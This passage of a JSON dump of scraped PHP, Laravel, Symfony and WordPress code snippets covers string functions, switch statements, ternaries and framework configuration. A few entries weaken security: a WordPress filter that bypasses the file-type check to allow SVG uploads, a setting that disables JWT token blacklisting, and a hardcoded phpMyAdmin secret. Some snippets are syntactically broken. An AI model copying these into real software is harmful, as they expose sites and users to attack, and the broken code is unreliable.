    "description": "$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date)); \n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4840,
    "keyword": null,
    "link": null,
    "title": " strtoupper",
    "description": "<?php /* There is a function in php wich convert all string to uppercase */    echo strtoupper(\"Hello samy! how are u ?\");   // output :   HELLO SAMY! HOW ARE U ? ?>\n <?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtoupper($str); echo $str; // muestra: MARY HAD A LITTLE LAMB AND SHE LOVED IT SO ?>  \nstring strtoupper ( $string ) \n<?php echo strtoupper(\"Hello WORLD!\"); ?>\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4841,
    "keyword": null,
    "link": null,
    "title": " strtoupper in php",
    "description": "$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n<?php /* There is a function in php wich convert all string to uppercase */    echo strtoupper(\"Hello samy! how are u ?\");   // output :   HELLO SAMY! HOW ARE U ? ?>\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\nstring strtoupper ( $string ) \n<?php echo strtoupper(\"Hello WORLD!\"); ?>\n$str = \"upper\"; //php string to uppercase echo strtoupper($str); // => UPPER\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4842,
    "keyword": null,
    "link": null,
    "title": " strtoupper php",
    "description": "<?php /* There is a function in php wich convert all string to uppercase */    echo strtoupper(\"Hello samy! how are u ?\");   // output :   HELLO SAMY! HOW ARE U ? ?>\n <?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtoupper($str); echo $str; // muestra: MARY HAD A LITTLE LAMB AND SHE LOVED IT SO ?>  \n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\nstring strtoupper ( $string ) \n<?php echo strtoupper(\"Hello WORLD!\"); ?>\n$str = \"upper\"; //php string to uppercase echo strtoupper($str); // => UPPER\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4843,
    "keyword": null,
    "link": null,
    "title": " submit form without page refresh using ajax jquery and php",
    "description": "$(document).ready(function(){ \t\t$('button').click(function(event){ \t\t\tevent.preventDefault(); \t\t\tvar\tname = $('#name').val(); \t\t\tvar\tmobile = $('#mobile').val(); \t\t\tvar\taddress = $('#address').val(); \t\t\tvar\tcity = $('#city').val(); \t\t\t$.ajax({ \t\t\t    type: \"POST\", \t\t\t    url: \"upload.php\", \t\t\t    data: { name:name, mobile:mobile, address:address, city:city },\t\t     \t\t\t    dataType: \"json\", \t\t\t    success: function(result){ \t\t\t        \t\t\t    } \t\t\t}); \t\t}); \t});\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4844,
    "keyword": null,
    "link": null,
    "title": " substr() php",
    "description": " <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$return_string = substr(\"Hi i am returning first 10 characters.\", 0, 10); Output: \"Hi i am re\"\n <?php $rest = substr(\"abcdef\", -1);    // retorna \"f\" $rest = substr(\"abcdef\", -2);    // retorna \"ef\" $rest = substr(\"abcdef\", -3, 1); // retorna \"d\" ?>  \nsubstr(string,start,length)\n<?php $rest = substr(\"abcdef\", 0, -1);  // \"abcde\" $rest = substr(\"abcdef\", 2, -1);  // \"cde\" $rest = substr(\"abcdef\", 4, -4);  // false $rest = substr(\"abcdef\", -3, -1); // \"de\"\n<?php // Return \"world\" from the string: echo substr(\"Hello world\", 6); ?>\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4845,
    "keyword": null,
    "link": null,
    "title": " subtract some days php",
    "description": "// First date of the month. $monthFirstDate = date('Y-m-01', strtotime('today'));  // Last date of the month. $monthLastDate = date('Y-m-t', strtotime('today'));  // Second last date of the month $monthLastSecondDate = date('Y-m-d', strtotime('-2 day', strtotime('today')));\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4846,
    "keyword": null,
    "link": null,
    "title": " sum of associative array in php",
    "description": "<?php $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  $arrSum = array_sum(array_column($items, 'price', 'name')); print \"Sum of Array : \".$arrSum.\"<br/>\"; ?>\n<?php $a=array(5,15,25); echo array_sum($a); ?>\n<?php $indexedArray = Array(20, 20, 5.5, \"str\"); $associativeArray = Array(     1 => 20,     2 => 20,     3 => 5.5,     4 => \"str\" );  echo array_sum($indexedArray) . \"<br>\"; // 45.5 echo array_sum($associativeArray); // 45.5  ?>\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4847,
    "keyword": null,
    "link": null,
    "title": " sum of numbers with comma php",
    "description": "<?php   $input = \"1,2,3,4,5,6,7,8,9,10\";          $sum = 0;          $input_arr = explode(\",\", $input);          print_r(array_sum($input_arr)); #with array function          // without array function          $sum = 0;     foreach($input_arr as $v){     \t//print \"</br>\".$v; \t\t$sum = $sum + $v;         }     print \"</br>\".$sum;    ?>\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4848,
    "keyword": null,
    "link": null,
    "title": " sum of the array elements in php",
    "description": "<?php $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  $arrSum = array_sum(array_column($items, 'price', 'name')); print \"Sum of Array : \".$arrSum.\"<br/>\"; ?>\nReturn the sum of all the values in the array (5+15+25):  <?php $a=array(5,15,25); echo array_sum($a); ?>\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4849,
    "keyword": null,
    "link": null,
    "title": " svg upload wordpress functions.php",
    "description": "// Wp v4.7.1 and higher add_filter( 'wp_check_filetype_and_ext', function($data, $file, $filename, $mimes) {   $filetype = wp_check_filetype( $filename, $mimes );   return [       'ext'             => $filetype['ext'],       'type'            => $filetype['type'],       'proper_filename' => $data['proper_filename']   ];  }, 10, 4 );  function cc_mime_types( $mimes ){   $mimes['svg'] = 'image/svg+xml';   return $mimes; } add_filter( 'upload_mimes', 'cc_mime_types' );  function fix_svg() {   echo '<style type=\"text/css\">         .attachment-266x266, .thumbnail img {              width: 100% !important;              height: auto !important;         }         </style>'; } add_action( 'admin_head', 'fix_svg' );\n// Enable SVG support function add_mime_types($mimes) { \t$mimes['svg'] = 'image/svg+xml'; \treturn $mimes; } add_filter('upload_mimes', 'add_mime_types'); \n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4850,
    "keyword": null,
    "link": null,
    "title": " sweet alert confirm box laravel",
    "description": "<script src=\"https://unpkg.com/sweetalert/dist/sweetalert.min.js\"></script>  $('.delete-confirm').on('click', function (event) {     event.preventDefault();     const url = $(this).attr('href');     swal({         title: 'Are you sure?',         text: 'This record and it`s details will be permanantly deleted!',         icon: 'warning',         buttons: [\"Cancel\", \"Yes!\"],     }).then(function(value) {         if (value) {             window.location.href = url;         }     }); });\n$(document).on('click', '.button', function (e) {     e.preventDefault();     var id = $(this).data('id');     swal({             title: \"Are you sure!\",             type: \"error\",             confirmButtonClass: \"btn-danger\",             confirmButtonText: \"Yes!\",             showCancelButton: true,         },         function() {             $.ajax({                 type: \"POST\",                 url: \"{{url('/destroy')}}\",                 data: {id:id},                 success: function (data) {                               //                     }                      });     }); });\n<a href=\"\" class=\"button\" data-id=\"{{$user->id}}\">Delete</a>\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4851,
    "keyword": null,
    "link": null,
    "title": " switch between php version ubuntu nginx",
    "description": "sudo service nginx restart sudo service php7.1-fpm or php7.2-fpm  restart \nsudo update-alternatives --config php \n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4852,
    "keyword": null,
    "link": null,
    "title": " switch case in laravel controller",
    "description": "you can use $request->get('submitbutton') in your method :  for example : public function setGroupApprovel(Request $request) {     switch ($request->get('submitbutton')) {         case 'save':             $groups_create_subscription = new GroupSubscription();             $groups_create_subscription->idgroups = $request->input('idgroup');             $groups_create_subscription->subscriber = $request->input('iduser');             $groups_create_subscription->save();             break;         case 'nosave':              $groups_request = new GroupRequest();             $groups_request->iduser::find($request->iduser);             $groups_request->request_active = 0;             $groups_request->save;             break;     } }  and i use : <input id='submit' class=\"btn btn-default\" type='submit' name = 'submitbutton' value = 'save'> <input id='submit' class=\"btn btn-default\" type='submit' name = 'submitbutton' value = 'nosave'>  instead of : {!! Form::submit('Yes',['class' => 'btn btn-default', 'name' => 'submitbutton', 'value' => 'save'])!!} {!! Form::submit('No',['class' => 'btn btn-default', 'name' => 'submitbutton', 'value' => 'nosave'])!!}\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4853,
    "keyword": null,
    "link": null,
    "title": " switch case php",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\n$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\n$fruit = \"apple\"; switch ($fruit) {   case \"apple\":     echo \"doctor\";     break;   case \"banana\":     echo \"monkey\";     break;   default:    \techo \"things\"; }//doctor\nswitch ($element) {     case 0:         echo \"i es igual a 0\";         break;     case 1:         echo \"i es igual a 1\";         break;     case 2:         echo \"i es igual a 2\";         break; }\n<?php  $fav_food = \"burger\";  switch($fav_food) {     case \"pavbhaji\":         echo \"My favourite food is pavbhaji\";         break;      case \"dhosa\":         echo \"My favourite food is dhosa\";         break;      case \"dabeli\":         echo \"My favourite food is dabeli\";         break;          case \"burger\":         echo \"my favourite food is burger\";         break;      default:         echo \"I am foody..\";         break; } ?>\n<?php switch ($i) {     case \"apple\":         echo \"i is apple\";         break;     case \"bar\":         echo \"i is bar\";         break;     case \"cake\":         echo \"i is cake\";         break; } ?>\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4854,
    "keyword": null,
    "link": null,
    "title": " switch in laravel",
    "description": "@switch($i)     @case(1)         First case...         @break      @case(2)         Second case...         @break      @default         Default case... @endswitch\n <?php switch ($i) {     case \"apple\":         echo \"i is apple\";         break;     case \"bar\":         echo \"i is bar\";         break;     case \"cake\":         echo \"i is cake\";         break; } ?>  \nyou can use $request->get('submitbutton') in your method :  for example : public function setGroupApprovel(Request $request) {     switch ($request->get('submitbutton')) {         case 'save':             $groups_create_subscription = new GroupSubscription();             $groups_create_subscription->idgroups = $request->input('idgroup');             $groups_create_subscription->subscriber = $request->input('iduser');             $groups_create_subscription->save();             break;         case 'nosave':              $groups_request = new GroupRequest();             $groups_request->iduser::find($request->iduser);             $groups_request->request_active = 0;             $groups_request->save;             break;     } }  and i use : <input id='submit' class=\"btn btn-default\" type='submit' name = 'submitbutton' value = 'save'> <input id='submit' class=\"btn btn-default\" type='submit' name = 'submitbutton' value = 'nosave'>  instead of : {!! Form::submit('Yes',['class' => 'btn btn-default', 'name' => 'submitbutton', 'value' => 'save'])!!} {!! Form::submit('No',['class' => 'btn btn-default', 'name' => 'submitbutton', 'value' => 'nosave'])!!}\n",
    "reg_date": "2021-10-12T10:20:31.000Z"
  },
  {
    "id": 4855,
    "keyword": null,
    "link": null,
    "title": " switch php",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\n$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\n$fruit = \"apple\"; switch ($fruit) {   case \"apple\":     echo \"doctor\";     break;   case \"banana\":     echo \"monkey\";     break;   default:    \techo \"things\"; }//doctor\nswitch ($element) {     case 0:         echo \"i es igual a 0\";         break;     case 1:         echo \"i es igual a 1\";         break;     case 2:         echo \"i es igual a 2\";         break; }\nswitch ($i) {     case 0:         echo \"i ist gleich 0\";         break;     case 1:         echo \"i ist gleich 1\";         break;     case 2:         echo \"i ist gleich 2\";         break; }\nswitch ($i) {     case 0:         echo \"i equals 0\";         break;     case 1:         echo \"i equals 1\";         break;     case 2:         echo \"i equals 2\";         break;     default:        echo \"i is not equal to 0, 1 or 2\"; }\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4856,
    "keyword": null,
    "link": null,
    "title": " symfony call another controller",
    "description": "// OtherController::fancy($name, $color) will be executed public function myAction($name) {     $response = $this->forward(     \t'App\\Controller\\OtherController::fancy',     \tarray(       \t\t'name'  => $name,         \t'color' => 'green',     \t)     );     // ... further modify the response or return it directly     return $response; }\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4857,
    "keyword": null,
    "link": null,
    "title": " symfony change php version",
    "description": "echo 7.4 > .php-version\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4858,
    "keyword": null,
    "link": null,
    "title": " symfony clear cache",
    "description": "./bin/console cache:clear\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4859,
    "keyword": null,
    "link": null,
    "title": " symfony convert entity to array",
    "description": "$entityAsArray = $this->serializer->normalize($entity, null); \n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4860,
    "keyword": null,
    "link": null,
    "title": " symfony demo with composer",
    "description": "$ composer create-project symfony/symfony-demo my_project\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4861,
    "keyword": null,
    "link": null,
    "title": " symfony doctrine existing database",
    "description": "$ php bin/console doctrine:mapping:import \"App\\Entity\" annotation --path=src/Entity \n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4862,
    "keyword": null,
    "link": null,
    "title": " symfony exclude class from autowiring",
    "description": "App\\:   resource: '../src/*'   exclude: ['../src/{Infrastructure/Symfony,Domain,Tests}', '../src/**/*Exception.php']\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4863,
    "keyword": null,
    "link": null,
    "title": " symfony findby",
    "description": "$repository = $this->getDoctrine()->getRepository(Product::class);  // look for a single Product by its primary key (usually \"id\") $product = $repository->find($id);  // look for a single Product by name $product = $repository->findOneBy(['name' => 'Keyboard']); // or find by name and price $product = $repository->findOneBy([     'name' => 'Keyboard',     'price' => 1999, ]);  // look for multiple Product objects matching the name, ordered by price $products = $repository->findBy(     ['name' => 'Keyboard'],     ['price' => 'ASC'] );  // look for *all* Product objects $products = $repository->findAll(); \n$service = $repository->findBy(array('name' => 'Registration'),array('name' => 'ASC'),1 ,0)[0];\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4864,
    "keyword": null,
    "link": null,
    "title": " symfony get path to route",
    "description": "// from controller method $url = $this->generateUrl(\"route_name\", array(   \"param1\" => \"value1\",   \"param2\" => \"value2\"/*, ... */ );  // from twig template {{ path('route_name', {'param1': 'value1', 'param2': 'value2'}) }}\n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4865,
    "keyword": null,
    "link": null,
    "title": " symfony get post params",
    "description": "use Symfony\\Component\\HttpFoundation\\Request;  $request = Request::createFromGlobals();  // the URI being requested (e.g. /about) minus any query parameters $request->getPathInfo();  // retrieves $_GET and $_POST variables respectively $request->query->get('id'); $request->request->get('category', 'default category');  // retrieves $_SERVER variables $request->server->get('HTTP_HOST');  // retrieves an instance of UploadedFile identified by \"attachment\" $request->files->get('attachment');  // retrieves a $_COOKIE value $request->cookies->get('PHPSESSID');  // retrieves an HTTP request header, with normalized, lowercase keys $request->headers->get('host'); $request->headers->get('content-type');  $request->getMethod();    // e.g. GET, POST, PUT, DELETE or HEAD $request->getLanguages(); // an array of languages the client accepts \n",
    "reg_date": "2021-10-12T10:20:32.000Z"
  },
  {
    "id": 4866,
    "keyword": null,
    "link": null,
    "title": " symfony get query param",
    "description": "$params = $this->getRequest()->request->all(); $params['value1']; $params['value2'];\n$request->query->get('paramName')\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4867,
    "keyword": null,
    "link": null,
    "title": " symfony header token authorization",
    "description": "$authorizationHeader = $request->headers->get('Authorization');         $authorizationHeaderArray = explode(' ', $authorizationHeader);         $token = $authorizationHeaderArray[1] ?? null;         $jwtToken = $this->JWTEncoder->decode($token);         dd($jwtToken);\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4868,
    "keyword": null,
    "link": null,
    "title": " symfony request get all parameters",
    "description": "$params = $this->getRequest()->request->all(); $params['value1']; $params['value2'];\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4869,
    "keyword": null,
    "link": null,
    "title": " symfony schema update",
    "description": "// Symfony 4 php bin/console doctrine:schema:update --force\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4870,
    "keyword": null,
    "link": null,
    "title": " symfony see all make command",
    "description": "php bin/console list make\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4871,
    "keyword": null,
    "link": null,
    "title": " symfony see all make commands",
    "description": "php bin/console list make\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4872,
    "keyword": null,
    "link": null,
    "title": " symfony start",
    "description": "$ cd my-project/  # start the server in the background $ symfony serve -d  # continue working and running other commands...  # show the latest log messages $ symfony server:log  # stop the server symfony server:stop\nphp -S localhost:8000 -t public/ \n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4873,
    "keyword": null,
    "link": null,
    "title": " symfony swift mailer configuration",
    "description": "<?php //This is a class throw it in your symfony project  //and use it to send all your email  // easy money <3  namespace App\\CostomClass;  // fix your name space or create a folder named CostomClass in your src  use App\\Repository\\ParametreRepository; use Symfony\\Component\\DependencyInjection\\ContainerInterface;  Class SendMail{      function __construct( $Email , $Subject ,  $text )     {         $this->Email = $Email ;             //string         $this->Subject = $Subject ;         //string         $this->text = $text ;         //string     }       //SMTP         public function sendMessageWithSMTP()     {          $transport = (new \\Swift_SmtpTransport('smtp.office365.com', 25, 'tls'))             ->setUsername('youremail@yourhost.xx')             ->setPassword('YourPassword');         $transport->setLocalDomain('[127.0.0.1]');         $mailer = new \\Swift_Mailer($transport);          try {             $message = (new \\Swift_Message($this->Subject))                 ->setFrom(array('youremail@yourhost.xx' => \"Subject\"))                 ->setTo( $this->Email)                 //->setBcc($client)                 ->setBody($this->text, 'text/html');             $mailer->send($message);          } catch (\\Exception $e) {             return $e->getMessage();         }          return 1;      }  // Gmail       public function sendMessageWithGmail()     {          $transport = (new \\Swift_SmtpTransport('smtp.gmail.com', 465, 'ssl'))             ->setUsername('mail@gmail.com')             ->setPassword('Password');         $transport->setLocalDomain('[127.0.0.1]'); // don't really need it         $mailer = new \\Swift_Mailer($transport);          try {             $message = (new \\Swift_Message($this->Subject))                 ->setFrom(array('mail@gmail.com' => \"Subject\"))                 ->setTo( $this->Email)                 //->setBcc($client)                 ->setBody($this->text, 'text/html');             $mailer->send($message);          } catch (\\Exception $e) {             return $e->getMessage();         }          return 1;      }    // how to use anywhere in your project: // in any controller  // $sendMail = new SendMail(\"youremail@gmail.com\",\"test\",\"hello world\"); // $result = $sendMail->sendMessageWithSMTP( $mailer); // or // $result = $sendMail->sendMessageWithGmail( $mailer); // dump($result);die(); 1 for the win and erreur mesage if something went wrong   }\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4874,
    "keyword": null,
    "link": null,
    "title": " symlink in php",
    "description": "<?ph   // Symlink() is a function to create a symbolic link   $target = 'path/to/somefile.extension';   $link = 'File New Link Name';   $test = symlink($target, $link);   if($test) {     echo 'Link created Successfuly.';   }else {     echo 'link creation failed.';   } ?>\n",
    "reg_date": "2021-10-12T10:20:33.000Z"
  },
  {
    "id": 4875,
    "keyword": null,
    "link": null,
    "title": " symnfony bearer token",
    "description": " 'auth_bearer' => 'the-bearer-token',\n$authorizationHeader = $request->headers->get('Authorization');         $authorizationHeaderArray = explode(' ', $authorizationHeader);         $token = $authorizationHeaderArray[1] ?? null;         $jwtToken = $this->JWTEncoder->decode($token);         dd($jwtToken);\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4876,
    "keyword": null,
    "link": null,
    "title": " table has column laravel",
    "description": "// You may check for the existence of a table or column // using the hasTable and hasColumn methods:  if (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\nSchema::hasColumn('users', 'email') // laravel\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4877,
    "keyword": null,
    "link": null,
    "title": " tailwind text vertical alignment doesn't work",
    "description": "<div class=\"flex h-screen\">   <div class=\"m-auto\">     <h3>title</h3>     <button>button</button>   </div> </div> \n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4878,
    "keyword": null,
    "link": null,
    "title": " take 10 character from string using php",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\n$return_string = substr(\"Hi i am returning first 10 characters.\", 0, 10); Output: \"Hi i am re\"\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4879,
    "keyword": null,
    "link": null,
    "title": " take last four digits php",
    "description": "$newstring = substr($dynamicstring, -7);\n$number = 12356; $lastDigit = $number % 10; echo $lastDigit; // 6\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4880,
    "keyword": null,
    "link": null,
    "title": " tax query by term id",
    "description": "<?php $args = array( 'post_type' => 'recipe_cpt', 'tax_query' => array(     array(     'taxonomy' => 'recipe_tx',     'field' => 'term_id',     'terms' => 37      )   ) ); $query = new WP_Query( $args ); ?> \n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4881,
    "keyword": null,
    "link": null,
    "title": " taxonomy acf",
    "description": "<?php  $term = get_field('taxonomy_field_name'); if( $term ): ?>     <h2><?php echo esc_html( $term->name ); ?></h2>     <p><?php echo esc_html( $term->description ); ?></p> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4882,
    "keyword": null,
    "link": null,
    "title": " tcpdf error unable to create output file in php",
    "description": " $pdf->Output(__DIR__.\"/../invoices/invoice_\".date('d-M-Y').\".pdf\", 'F');\n",
    "reg_date": "2021-10-12T10:20:34.000Z"
  },
  {
    "id": 4883,
    "keyword": null,
    "link": null,
    "title": " ternary expressions php",
    "description": "$result = $condition ? 'foo' : 'bar';\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4884,
    "keyword": null,
    "link": null,
    "title": " ternary in php",
    "description": "(Condition) ? (Statement1) : (Statement2); \n<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\n(conditional) ? (true) : (false);\n// Both ternary and if/else returns the same result  // ternary $result = $condition ? 'foo' : 'bar';  // if/else if ($condition) {     $result = 'foo'  } else {     $result = 'bar' }\nprint ($marks>=40) ? \"pass\" : \"Fail\";\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4885,
    "keyword": null,
    "link": null,
    "title": " ternary operator for three conditions in php",
    "description": "$foo = your_value; $bar = ($foo == 1) ? \"1\" : (($foo == 2)  ? \"2\" : \"other\"); echo $bar;\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4886,
    "keyword": null,
    "link": null,
    "title": " ternary operator in php",
    "description": "(Condition) ? (Statement1) : (Statement2); \n<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\n// Both ternary and if/else returns the same result  // ternary $result = $condition ? 'foo' : 'bar';  // if/else if ($condition) {     $result = 'foo'  } else {     $result = 'bar' }\necho $color = $color ?? 'red';\t//if value not exists then assign to them.\n<?php   $x=4;   $y=3;   if(x>y)?echo\"X is large\": echo \"y is large\";   ?> \n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4887,
    "keyword": null,
    "link": null,
    "title": " ternary operator laravel blade",
    "description": "//laravel {{ condition ? 'yes' : 'no' }}\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4888,
    "keyword": null,
    "link": null,
    "title": " terug tellende for loop php",
    "description": "<?php // a array $weekday = array(\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\", \"Sunday\"); // the for loop for($i = 6; $i >= 0; $i = $i -1){      print ( \"$weekday[$i]<br>\" ); } ?>\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4889,
    "keyword": null,
    "link": null,
    "title": " teruglopende for loop php",
    "description": "<?php // a array $weekday = array(\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\", \"Sunday\"); // the for loop for($i = 6; $i >= 0; $i = $i -1){      print ( \"$weekday[$i]<br>\" ); } ?>\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4890,
    "keyword": null,
    "link": null,
    "title": " test if php is installed",
    "description": "Create a php file containing code <? php echo phpinfo(); ?> and save it as test.php.    then you have installed PHP properly.\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4891,
    "keyword": null,
    "link": null,
    "title": " test laravel create each(function ($u)",
    "description": "public function run() {   factory(App\\User::class, 2)->create()->each(function($u) {     $u->issues()->save(factory(App\\Issues::class)->make());   }); } \n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4892,
    "keyword": null,
    "link": null,
    "title": " test laravel scheduler",
    "description": "Set the cron to run after every minute: * * * * * cd /path-to-your-project && php artisan schedule:run >> /dev/null 2>&1    Then inisde you kernel.php //For every minute $schedule->call(function () { \tLog::info('I ran after every 1 minute'); })->everyMinute(); //For every five minute $schedule->call(function () { \tLog::info('I ran after every 5 minute'); })->everyFiveMinutes();\n",
    "reg_date": "2021-10-12T10:20:35.000Z"
  },
  {
    "id": 4893,
    "keyword": null,
    "link": null,
    "title": " the configuration file now needs a secret passphrase (blowfish secret)",
    "description": "cp /usr/share/phpmyadmin/config.sample.inc.php /usr/share/phpmyadmin/config.inc.php $cfg['blowfish_secret'] = 'KLS$vbc91Lkja$vc@opGbxA278EWopdc';\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4894,
    "keyword": null,
    "link": null,
    "title": " the requested PHP extension curl is missing from your system.",
    "description": "sudo apt-get install php-curl \n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4895,
    "keyword": null,
    "link": null,
    "title": " the requested PHP extension pcntl is missing from your system",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4896,
    "keyword": null,
    "link": null,
    "title": " the requested url was not found on this server. laravel",
    "description": "sudo a2enmod rewrite  \n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4897,
    "keyword": null,
    "link": null,
    "title": " the token has been blacklisted laravel jwt",
    "description": "//  Men sizga bunday qilishni maslahat bermayman. Lekin u ishlaydi // I do not advise you to do so. But it works    //You can edit your config/jwt.php about line 224. 'blacklist_enabled' => env('JWT_BLACKLIST_ENABLED', false),\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4898,
    "keyword": null,
    "link": null,
    "title": " throwexception laravel",
    "description": "throw new \\ErrorException('Error found');\npublic function isValid($value) {     try {         // Validate the value...     } catch (Throwable $e) {         report($e);          return false;     } }\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4899,
    "keyword": null,
    "link": null,
    "title": " time ago php",
